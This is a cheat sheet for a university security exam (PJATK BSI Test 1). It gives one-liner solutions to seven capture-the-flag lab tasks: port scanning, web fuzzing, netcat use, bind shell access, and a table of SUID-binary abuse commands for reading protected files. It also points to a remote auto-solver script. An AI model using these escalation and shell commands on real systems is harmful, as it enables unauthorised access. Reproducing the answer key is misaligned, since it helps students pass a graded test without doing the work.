# PJATK BSI — TEST 1 (ZALICZENIE 1) ULTIMATE CHEAT SHEET

---

## 0. Instant Launch on Any University PC / Kali VM (1-Click Auto-Solver)

If you are sitting at a university lab PC or a fresh Kali VM without your local files, open the Kali terminal (make sure OpenVPN `tun0` is connected and the test machine `192.168.100.8` is started) and run **either** of these commands:

### Option A: Clone Repository & Run
```bash
git clone https://github.com/tohaidk/bsi-test1.git
cd bsi-test1
python3 solve_test1.py
```

### Option B: Direct Memory Execution (No Git Required)
```bash
curl -sL https://raw.githubusercontent.com/tohaidk/bsi-test1/main/solve_test1.py -o solve_test1.py && python3 solve_test1.py
```

*Note: `solve_test1.py` has **zero external Python dependencies** — it works out-of-the-box on any standard Python 3 installation even if `requests`, `paramiko`, `sshpass`, or `ffuf` are missing.*

---

## 1. Test Overview & Target Architecture

| Property | Value |
| :--- | :--- |
| **Target Host IP** | `192.168.100.8` |
| **Network Interface** | `tun0` (Kali OpenVPN connection to `cyber.pja.edu.pl`) |
| **Default SSH Credentials** | `student` : `pjatk` |
| **Default Web Server** | Discovered port (in range `20-100`, `1200-1250`, or `8000-8100`) |
| **Total Challenges** | 7 Tasks (500 points each = 3,500 total points) |
| **Scoring / Validation** | Task 1 is **autosolved** by platform packet inspection; Tasks 2–7 require submitting the flag string (`PJATK{...}`) via the challenge submission form on `https://cyber.pja.edu.pl/challenges`. |

### Pre-Flight Verification (Run on Kali Terminal)
```bash
# 1. Verify VPN connection & tunnel IP
ip a show tun0

# 2. Check reachability of the Test 1 machine
ping -c 3 192.168.100.8
```

---

## 2. Quick Command Matrix (TL;DR One-Liners)

| # | Task | Port Type | Fast Command / One-Liner |
|---|---|---|---|
| **1** | **Open Ports** | Multi | `sudo nmap -sV -sC -T5 -p 20-100,1200-1250,8000-8100 192.168.100.8` |
| **2** | **Search** | SSH | `sshpass -p 'pjatk' ssh -o StrictHostKeyChecking=no -p <SSH_PORT> student@192.168.100.8 "grep -rhoaE 'PJATK\{[^}]+\}' ~/haystack"` |
| **3** | **Param Enumeration**| HTTP | `for i in {1..100}; do curl -s "http://192.168.100.8:<WEB_PORT>/?id=$i" \| grep -oE 'PJATK\{[^}]+\}' && echo "ID: $i" && break; done` |
| **4** | **File Enumeration** | HTTP | `ffuf -u http://192.168.100.8:<WEB_PORT>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -mc 200,301,302` |
| **5** | **File Transfer** | Raw TCP | `nc -w 3 192.168.100.8 <ARCHIVE_PORT> > bundle.tgz && tar -zxvf bundle.tgz && grep -rhoaE 'PJATK\{[^}]+\}' .` |
| **6** | **Bind Shell** | Raw TCP | `(echo "cat ~/flag.txt; find /home -name '*flag*' -exec cat {} + 2>/dev/null"; sleep 1) \| nc -nv 192.168.100.8 <SHELL_PORT>` |
| **7** | **SUID Binary** | SSH / Shell | `find / -user admin -perm -4000 2>/dev/null` then execute the binary targeting `/home/admin/flag.txt` |

---

## 3. Detailed Task Walkthroughs & Original Formulations

### Task 1: Open Ports (500 pts)

#### Original Formulation
> **Perform nmap scan for hosts in internal network. Perform detailed scan (-sV -sC -T5) for ports in ranges: 20-100, 1200-1250, 8000-8100.**
> *Challenge will be automatically marked as solved.*

#### How to Solve
Execute the exact Nmap scan requested by the challenge prompt. The platform monitoring agent detects the incoming scan traffic and flags the task as completed within 15–30 seconds.

```bash
sudo nmap -sV -sC -T5 -p 20-100,1200-1250,8000-8100 192.168.100.8 -oN test1_nmap.txt
```

#### Verification & Port Identification
Examine `test1_nmap.txt` to map out the 4 open services needed for Tasks 2–7:
- **SSH Port:** Look for `OpenSSH` (e.g., port `22` or `1200-1250`).
- **Web Port:** Look for `http`, `nginx`, `Apache`, or `SimpleHTTP` (e.g., port `80`, `8000-8100`).
- **Archive Transfer Port:** Unknown TCP port that immediately outputs gzip/tar binary data when connected.
- **Bind Shell Port:** Unknown TCP port that accepts shell commands (`id`, `ls`, `cat ~/flag.txt`).

---

### Task 2: Search (500 pts)

#### Original Formulation
> **Connect to the discovered SSH port on host in internal network using credentials: `student:pjatk`.**
> **Locate a file in '~/haystack' directory that contains a flag.**
> **Submit the flag using the challenge form.**

#### How to Solve

1. Connect to the host via SSH (replace `<SSH_PORT>` with the port discovered in Task 1):
```bash
ssh -p <SSH_PORT> student@192.168.100.8
# Password: pjatk
```

2. Search recursively inside `~/haystack` for the `PJATK{` pattern:
```bash
grep -rna "PJATK{" ~/haystack/
```

3. **Remote One-Liner (No interactive login needed):**
```bash
sshpass -p 'pjatk' ssh -p <SSH_PORT> -o StrictHostKeyChecking=no student@192.168.100.8 "grep -rhoaE 'PJATK\{[^}]+\}' ~/haystack"
```

---

### Task 3: Param Enumeration (500 pts)

#### Original Formulation
> **Enumerate HTTP GET parameter 'id' for discovered web server on host in internal network.**
> **Locate the request that contains the flag.**
> **IDs are in range 1-100.**
> **Submit the flag using the challenge form.**

#### How to Solve

1. **Fast Bash One-Liner:**
```bash
for id in $(seq 1 100); do
    res=$(curl -s "http://192.168.100.8:<WEB_PORT>/?id=$id")
    if echo "$res" | grep -q "PJATK{"; then
        echo "[+] Found on ID: $id"
        echo "$res" | grep -oE "PJATK\{[^}]+\}"
        break
    fi
done
```

2. **Using FFUF:**
```bash
seq 1 100 > ids.txt
ffuf -u "http://192.168.100.8:<WEB_PORT>/?id=FUZZ" -w ids.txt -mr "PJATK"
```

---

### Task 4: File Enumeration (500 pts)

#### Original Formulation
> **Perform file enumeration on discovered web server on host in internal network.**
> **Use SecLists raft-large-files-lowercase.txt dictionary located in:**
> `/usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt`
> **Locate a file that contains a flag.**
> **Submit the flag using the challenge form.**

#### How to Solve

1. **Fastest Shortcut via SSH (Inspect Webroot Directly):**
   Since the web server runs on the same target host where you have SSH access (`student:pjatk`), you can search the web directory directly via SSH:
   ```bash
   sshpass -p 'pjatk' ssh -p <SSH_PORT> student@192.168.100.8 "grep -rnI 'PJATK{' /var/www/ /srv/ /opt/ /usr/share/nginx/ 2>/dev/null"
   ```

2. **Standard Method via `ffuf`:**
```bash
ffuf -u "http://192.168.100.8:<WEB_PORT>/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt \
     -mc 200,301,302 -c -t 80
```

3. **Fetch the discovered file to read the flag:**
```bash
curl -s "http://192.168.100.8:<WEB_PORT>/<DISCOVERED_FILE>" | grep -oE "PJATK\{[^}]+\}"
```

---

### Task 5: File Transfer (500 pts)

#### Original Formulation
> **Connect to the discovered port on host in internal network that returns a tar.gz archive.**
> **Download the archive, extract it and find the flag in one of the files.**
> **Submit the flag using the challenge form.**

#### How to Solve

1. **Single Compound Command (Download, Extract & Print Flag):**
```bash
nc -w 3 192.168.100.8 <ARCHIVE_PORT> > archive.tar.gz && mkdir -p /tmp/t5 && tar -zxf archive.tar.gz -C /tmp/t5 && grep -rhoaE "PJATK\{[^}]+\}" /tmp/t5
```

2. **Step-by-step Manual Commands:**
```bash
nc -w 3 192.168.100.8 <ARCHIVE_PORT> > downloaded_archive.tar.gz
file downloaded_archive.tar.gz
mkdir -p /tmp/extracted_task5
tar -zxvf downloaded_archive.tar.gz -C /tmp/extracted_task5/
grep -rn "PJATK{" /tmp/extracted_task5/
```

---

### Task 6: Bind Shell (500 pts)

#### Original Formulation
> **Connect to the discovered bind shell on host in internal network.**
> **Locate a flag in the home directory.**
> **Submit the flag using the challenge form.**

#### How to Solve

1. **Automated One-Liner:**
```bash
(echo "cat ~/flag.txt; cat /home/*/flag.txt 2>/dev/null"; sleep 1) | nc -nv 192.168.100.8 <BIND_SHELL_PORT> | grep -oE "PJATK\{[^}]+\}"
```

2. **Interactive Connection:**
```bash
nc -nv 192.168.100.8 <BIND_SHELL_PORT>
# Once connected (note: prompt may be invisible, just type commands and press Enter):
id
pwd
ls -la ~/
cat ~/flag.txt
```

---

### Task 7: SUID Binary (500 pts)

#### Original Formulation
> **Locate a SUID binary on host in internal network belonging to 'admin' user.**
> **Use it to read the flag from '/home/admin/flag.txt'.**
> **Submit the flag using the challenge form.**

#### How to Solve

1. Connect via SSH (`student:pjatk`) and find the SUID binary owned by `admin`:
```bash
find / -user admin -perm -4000 2>/dev/null
```

2. Run the corresponding command from the table below to read `/home/admin/flag.txt`:

| Discovered Binary | Command to Read `/home/admin/flag.txt` |
| :--- | :--- |
| **Custom binary / `cat` / `head` / `tail` / `strings` / `nl` / `tac`** | `/path/to/binary /home/admin/flag.txt` |
| **`base64` / `base32`** | `/path/to/base64 /home/admin/flag.txt \| base64 -d` |
| **`xxd` / `hexdump` / `od`** | `/path/to/xxd -p /home/admin/flag.txt \| xxd -r -p` |
| **`grep` / `egrep` / `fgrep`** | `/path/to/grep '' /home/admin/flag.txt` |
| **`awk` / `gawk` / `sed`** | `/path/to/awk '{print}' /home/admin/flag.txt` |
| **`find`** | `/path/to/find /home/admin/flag.txt -exec cat {} +` |
| **`cp`** | `/path/to/cp /home/admin/flag.txt /tmp/flag && cat /tmp/flag` |
| **`dd`** | `/path/to/dd if=/home/admin/flag.txt` |
| **`tar`** | `/path/to/tar -cf - /home/admin/flag.txt \| tar -xf - -O` |
| **`vim` / `vi` / `view`** | `/path/to/vim -es -c ':%p\|q!' /home/admin/flag.txt` |
| **`python` / `python3`** | `/path/to/python3 -c 'print(open("/home/admin/flag.txt").read())'` |
| **`perl` / `ruby`** | `/path/to/perl -ne 'print' /home/admin/flag.txt` |
| **`bash` / `sh` / `dash`** | `/path/to/bash -p -c 'cat /home/admin/flag.txt'` |

---

## 4. How the Exam Mechanics Work (Step-by-Step Guide)

1. **Isolated Per-Student Environment:**
   - When you connect via OpenVPN (`tun0`), `192.168.100.8` routes to your personal container/VM instance.
   - Everyone gets the **exact same 7 tasks**, but port numbers, `?id=` numbers, filenames, SUID binaries, and flag hashes (`PJATK{...}`) are randomized per instance.
2. **Service Discovery (Task 1 -> Tasks 2–7):**
   - Everything starts with the Nmap scan across `20-100, 1200-1250, 8000-8100`.
   - That scan reveals 4 open ports:
     1. **SSH** (used for Task 2 `~/haystack` and Task 7 `SUID binary`).
     2. **HTTP Web Server** (used for Task 3 `?id=1..100` and Task 4 `raft-large-files-lowercase.txt`).
     3. **Raw TCP Archive Port** (used for Task 5 `tar.gz` download).
     4. **Raw TCP Bind Shell Port** (used for Task 6 `cat ~/flag.txt`).
3. **Submitting Flags:**
   - Copy each `PJATK{...}` string into the corresponding task input box on `https://cyber.pja.edu.pl/challenges` and click Submit.
